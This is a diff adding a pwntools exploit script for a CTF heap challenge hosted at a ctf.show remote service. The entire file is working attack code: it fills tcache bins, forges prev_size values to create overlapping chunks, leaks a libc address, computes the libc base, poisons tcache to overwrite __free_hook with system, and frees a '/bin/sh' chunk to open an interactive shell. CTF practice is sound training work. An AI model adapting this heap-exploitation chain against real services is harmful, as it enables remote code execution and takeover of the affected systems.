@@ -1,0 +1,70 @@
+from pwn import *
+context(arch = 'amd64',os = 'linux',log_level = 'debug')
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28169)
+elf = ELF('./pwn')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+def choice(c):
+        io.recvuntil('Your Choice: ')
+        io.sendline(str(c))
+def add(index,size,content):
+        choice(1)
+        io.recvuntil(':')
+        io.sendline(str(index))
+        io.recvuntil(':')
+        io.sendline(str(size))
+        io.recvuntil(':')
+        io.send(content)
+def show(index):
+        choice(3)
+        io.recvuntil(':')
+        io.sendline(str(index))
+def free(index):
+        choice(2)
+        io.recvuntil(':')
+        io.sendline(str(index))
+for i in range(7):
+        add(i,0xf0,'A')
+add(7,0xf0,'A')
+add(8,0x18,'A')
+add(9,0xf0,'A')
+add(10,0x28,'A')
+for i in range(7):
+        free(i)
+free(7)
+free(8)
+add(8,0x18,'A'*0x10+p64(0x120))
+free(9)
+add(7,0xd0,'A')
+add(9,0x10,'A')
+show(8)
+leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+success(hex(leak))
+libc_base = leak-0x3ebca0
+success(hex(libc_base))
+free_hook = libc_base + libc.sym['__free_hook']
+system = libc_base + libc.sym['system']
+free(7)
+free(9)
+for i in range(7):
+        add(i,0xf0,'A')
+add(9,0x10,'A')
+add(7,0x10,'A')
+add(11,0xf0,'A')
+#10
+add(12,0xf0,'A')
+add(13,0x20,'A')
+for i in range(7):
+        free(i)
+free(11)
+free(10)
+add(10,0x28,'A'*0x20+p64(0x130))
+free(10)
+free(12)
+add(0,0x90,'A')
+add(1,0x70,'A'*0x50+p64(0x100)+p64(0x30)+p64(free_hook))
+add(2,0x20,'A')
+add(3,0x20,p64(system))
+add(4,0xf0,'/bin/sh\x00')
+free(4)
+io.interactive()
